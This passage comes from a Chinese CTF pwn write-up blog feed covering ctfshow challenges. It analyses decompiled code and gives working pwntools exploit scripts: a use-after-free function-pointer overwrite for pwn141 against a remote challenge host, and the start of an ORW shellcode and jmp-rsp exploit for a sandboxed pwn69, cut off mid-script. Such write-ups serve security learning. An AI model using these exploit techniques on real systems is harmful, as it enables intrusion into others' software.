punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>ptr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"After free in main thread\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token function\">getchar</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">pthread_create</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>newthread<span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>threadFunc<span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Thread creation error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    result <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">pthread_join</span><span class=\"token punctuation\">(</span>newthread<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>thread_return<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token comment\">// 接收子线程函数的返回值</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Thread join error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    result <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"cat /ctfshow_flag\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    result <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>  <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __fastcall <span class=\"token function\">threadFunc</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>a1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>ptr<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+18h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Before malloc in thread 1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token function\">getchar</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  ptr <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"After malloc and before free in thread 1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">getchar</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>ptr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"After free in thread 1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">getchar</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h1 id=\"pwn141uaf\"><a class=\"anchor\" href=\"#pwn141uaf\">#</a> pwn141(uaf)</h1>\n<h2 id=\"题目-7\"><a class=\"anchor\" href=\"#题目-7\">#</a> 题目</h2>\n<p>题目描述: <code>使用已经释放的内存</code></p>\n<pre><code>Arch:     i386-32-little\nRELRO:    Partial RELRO\nStack:    Canary found\nNX:       NX enabled\nPIE:      No PIE (0x8048000)\n</code></pre>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/I%28%7BR60G%29%7EDJ3OACQVLG%29KQ8.png\" alt=\"\" /><br />\n<img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/JUJ_%7E%24MTO%28WCN0%24A5M3KI6F.png\" alt=\"\" /></p>\n<p>有个后门函数</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">use</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"cat /ctfshow_flag\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"漏洞分析\"><a class=\"anchor\" href=\"#漏洞分析\">#</a> 漏洞分析</h2>\n<p>可以看到题目说明 <code>使用释放的内存</code> ，看代码发现释放的空间没有将指针清空，所以可以接着使用这一部分内容，就可以对其进行改写；接着发现每个 <code>notelist+i</code> （从 1-4，起始 i 从 0-3）这个数组存放的是 <code>print_note_content</code>  函数来打印对应 chunk 内的内容，而其实最初的选项中打印内容 <code>print_note</code>  函数就是调用的这个函数，这样一来我们改写这个内存存放的函数为后门函数，再打印就能获得 flag</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">print_note_content</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>a1 <span class=\"token operator\">+</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>存放打印函数地址的内存也是由 malloc 来申请的，并且当我们执行一次 <code>add_note</code>  时就会申请一个 8 字节（不包含头部空间）的空间来存放 <code>ptrin_note_content</code>  地址：</p>\n<p>申请：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/MS%60D%7DJX%7ECZE6%5B16%7BR%5BFX%28G7.png\" alt=\"\" /></p>\n<p>查看堆：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/J%25D%7B%29DQ%7E3O7WBUV%5DP72ZU%608.png\" alt=\"\" /><br />\n<img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/PTL8%7DRYZ%60ILB%5DWHO4Y%24%40CUQ.png\" alt=\"\" /></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/KQJNKFTTTIK%25%5BVOL3NMI_SM.png\" alt=\"\" /></p>\n<p>从上面就可以知道，每次申请空间都会顺带申请一个 <code>print_note_content</code>  的空间，而只要将这里修改为后门就能执行获得 flag</p>\n<p>利用 uaf，释放我们申请的空间，然后将其 fd 指向存放 <code>print_note_content</code>  函数的地址，申请两次将存放 <code>print_note_content</code>  的内存申请回来修改，最后执行打印即可</p>\n<p>【但是这里如何修改 fastbin 中的 fd 呢，申请回去后脱离了 fastbin 表】</p>\n<p>【这里想复杂了，无法通过修改 fd 来指向存放 <code>print_note_content</code>  的 chunk，然后申请该 chunk，但是本身它自己就开辟了空间，通过释放后也会进入 fastbin，直接申请 8 字节然后就能申请回来修改地址，然后打印就行】</p>\n<p>这里注意一个细节：</p>\n<p>打印 index 0 是因为申请 <code>allocate(8,p32(use))</code>  时会先申请一个 8 字节来存放这个 chunk 的 <code>print_note_content</code> , 也就先将 index1 申请出去了，然后我们申请的其实是 index 0 所以打印 index 0，这也解释了为什么需要一开始要申请两个 chunk</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>from pwn import <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>from LibcSearcher import <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token char\">'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">p</span><span class=\"token expression\"><span class=\"token operator\">=</span><span class=\"token function\">process</span><span class=\"token punctuation\">(</span></span><span class=\"token string\">\"./pwn141\"</span><span class=\"token expression\"><span class=\"token punctuation\">)</span></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span><span class=\"token function\">remote</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"pwn.challenge.ctf.show\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28160</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">p</span><span class=\"token expression\"><span class=\"token operator\">=</span><span class=\"token function\">remote</span><span class=\"token punctuation\">(</span></span><span class=\"token char\">'node4.buuoj.cn'</span><span class=\"token expression\"><span class=\"token punctuation\">,</span><span class=\"token number\">25727</span><span class=\"token punctuation\">)</span></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">e</span><span class=\"token expression\"><span class=\"token operator\">=</span><span class=\"token function\">ELF</span><span class=\"token punctuation\">(</span></span><span class=\"token string\">\"./babyheap_0ctf_2017\"</span><span class=\"token expression\"><span class=\"token punctuation\">)</span></span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">write</span><span class=\"token expression\">_plt<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span></span><span class=\"token string\">\"write\"</span><span class=\"token expression\"><span class=\"token punctuation\">]</span></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">read</span><span class=\"token expression\">_plt<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span></span><span class=\"token string\">\"read\"</span><span class=\"token expression\"><span class=\"token punctuation\">]</span></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>use<span class=\"token operator\">=</span><span class=\"token number\">0x8049684</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>def <span class=\"token function\">allocate</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    p<span class=\"token punctuation\">.</span><span class=\"token function\">sendlineafter</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"choice :\"</span><span class=\"token punctuation\">,</span>b<span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    p<span class=\"token punctuation\">.</span><span class=\"token function\">sendlineafter</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Note size :\"</span><span class=\"token punctuation\">,</span><span class=\"token function\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    p<span class=\"token punctuation\">.</span><span class=\"token function\">sendlineafter</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Content :\"</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>def <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    p<span class=\"token punctuation\">.</span><span class=\"token function\">sendlineafter</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"choice :\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"2\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    p<span class=\"token punctuation\">.</span><span class=\"token function\">sendlineafter</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Index :\"</span><span class=\"token punctuation\">,</span><span class=\"token function\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>def <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    p<span class=\"token punctuation\">.</span><span class=\"token function\">sendlineafter</span><span class=\"token punctuation\">(</span>b<span class=\"token string\">\"choice :\"</span><span class=\"token punctuation\">,</span>b<span class=\"token string\">\"3\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    p<span class=\"token punctuation\">.</span><span class=\"token function\">sendlineafter</span><span class=\"token punctuation\">(</span>b<span class=\"token string\">\"Index :\"</span><span class=\"token punctuation\">,</span><span class=\"token function\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token function\">allocate</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"aaaa\"</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token function\">allocate</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"bbbb\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token function\">allocate</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token function\">p32</span><span class=\"token punctuation\">(</span>use<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 这里必须打印 index0，打印 index1 就不对</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>p<span class=\"token punctuation\">.</span><span class=\"token function\">recv</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>p<span class=\"token punctuation\">.</span><span class=\"token function\">interactive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"pwn142\"><a class=\"anchor\" href=\"#pwn142\">#</a> pwn142</h1>\n<h2 id=\"题目-8\"><a class=\"anchor\" href=\"#题目-8\">#</a> 题目</h2>\n<p>题目描述： <code>堆块重叠</code></p>\n<pre><code>Arch:     amd64-64-little\nRELRO:    Partial RELRO\nStack:    Canary found\nNX:       NX enabled\nPIE:      No PIE (0x400000)\n</code></pre>\n",
            "tags": [
                "pwn"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/10/26/pwn/%E5%88%B7%E9%A2%98/ctfshow/ctfshow69-79/",
            "url": "https://vvwwvv.cn/2023/10/26/pwn/%E5%88%B7%E9%A2%98/ctfshow/ctfshow69-79/",
            "title": "CTFshow(栈溢出部分,69~79)",
            "date_published": "2023-10-26T03:01:15.000Z",
            "content_html": "<h1 id=\"有收获的题目\"><a class=\"anchor\" href=\"#有收获的题目\">#</a> 有收获的题目</h1>\n<p>pwn69（沙盒机制）</p>\n<p>pwn76（逻辑分析题，栈迁移但是只覆盖了 ebp）</p>\n<p>pwn79（ret2reg, 利用 call /jmp 跳转到保存 shellcode 的地址的寄存器来执行）</p>\n<h1 id=\"pwn69沙盒机制\"><a class=\"anchor\" href=\"#pwn69沙盒机制\">#</a> pwn69（沙盒机制）</h1>\n<h2 id=\"题目\"><a class=\"anchor\" href=\"#题目\">#</a> 题目</h2>\n<p>题目描述： <code>可以尝试用ORW读flag flag文件位置为/ctfshow_flag</code></p>\n<pre><code>Arch:     amd64-64-little\nRELRO:    Partial RELRO\nStack:    No canary found\nNX:       NX disabled\nPIE:      No PIE (0x400000)\nRWX:      Has RWX segments\n</code></pre>\n<p><code>main函数</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>__int64 __fastcall <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a1<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>a2<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>a3<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token function\">mmap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token number\">0x123000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1000uLL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">34</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token function\">sub_400949</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">sub_400906</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token function\">sub_400A16</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>第一个函数 <code>sub_400949()</code></p>\n<p>看到启用了沙箱，这里是显示是黑名单过滤...</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/TS6T8XKT%60AM25%60XS89QQSKF.png\" alt=\"\" /></p>\n<p>查看第三个函数 <code>sub_400A16()</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">sub_400A16</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+0h] [rbp-20h] BYREF</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Now you can use ORW to do\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> <span class=\"token number\">0x38uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"No you don't understand I say!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这里可以溢出，但是溢出范围不大，没有开 NX 可以执行 shellcode，但是有沙箱，利用 <code>seccomp-tools</code>  工具看看</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/A%7DGHBZO8MUZ%7BDV%5B9RZ%7B%60YB8.png\" alt=\"\" /></p>\n<p>这里显示可以执行 orw，写入 orw 的 shellcode 执行</p>\n<p>这里还有一个问题就是，我们构造的 shellcode 写入到哪里，栈上可执行，但是栈的地址不知道，而 <code>main</code>  一开始使用 mmap 开辟了一块空间，权限为 6，可读写（可以利用 orw 进行读写，没有执行权限能执行 shellcode 吗？，这里在 mmap 中开辟的空间，有对应操作的权限即可执行对应命令）</p>\n<p>这里利用 mmap 空间将 flag 读入到这里，然后输出出来即可</p>\n<p>但是我们如何将 shellcode 注入到 mmap 空间里？</p>\n<p>因为溢出的 rop 大小受限，这里就需要利用汇编命令来执行，在栈上构造命令： <code>shellcode.read(0,mmap,0x100)+asm(mov rax,0x123000; jmp rax)</code>  这里是为了能够在 mmap 空间写入 shellcode 然后跳转执行</p>\n<p>但是在栈上的命令还需要去执行，发现程序有命令 <code>jmp rsp</code></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/9%605VT%40%7EOJ1G9D0WCWK1%5B%29KM.png\" alt=\"\" /></p>\n<p>可以利用该命令跳转回栈上执行（不知道为什么 wp 后面还跟有 <code>asm(&quot;sub rsp,0x30; jmp rsp&quot;)</code> , 感觉不需要，但是去掉就会报错，然后想了想，大概因为 leave 指令将栈顶给重置了，然后 ret 又 pop ebp，栈顶又减，所以 rsp 指向后面的命令 <code>asm(&quot;sub rsp,0x30; jmp rsp&quot;)</code> ）</p>\n<p>这里还有一个要点就是利用 open 打开的 flag 文件后文件描述符是 3，所以使用的 read（3，mmap，0x100）这里也要文件描述符变成 3（因为 0，1，2 是标志的输入输出，标准错误）</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn69'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#e=ELF('./')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#p=remote('node4.buuoj.cn',28249)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#p=remote(\"pwn.challenge.ctf.show\",28220)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>shellcode <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>mmap<span class=\"token operator\">=</span><span class=\"token number\">0x123000</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>jmp_rsp<span class=\"token operator\">=</span><span class=\"token number\">0x0000000000400a01</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"to do\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>shellcode<span 